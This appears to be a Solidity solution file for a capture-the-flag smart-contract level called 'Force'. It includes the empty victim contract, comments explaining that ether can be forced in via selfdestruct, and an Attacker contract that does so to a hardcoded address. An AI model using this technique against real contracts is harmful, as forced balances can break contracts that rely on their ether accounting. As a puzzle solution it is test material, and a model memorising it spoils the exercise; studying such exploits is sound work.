// VICTIM CONTRACT AS GIVEN BY THE TASK DESCRIPTION
// TASK: The goal of this level is to make the balance of the contract greater than zero.





// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}



//SOLUTION
//- this contract does not have a payable fallback or receive function, nevertheless it can receive ETH by selfdestruct or mining rewards
//- in this case we will write a simple attacker contract that selfdestructs and send its balance to the Force contract
//- the selfdestruct function must be called with a value > 0 so that some actual balance is sent over to the Force contract
//- afterwards, check the balance of the Force contract: await getBalance(instance)


contract Attacker{

	address payable victim = payable(address(0x59fAA5814E51A2270f8571764971C82e3eCe5C0e));

	function attack() public payable {
		selfdestruct(victim);
	}

}



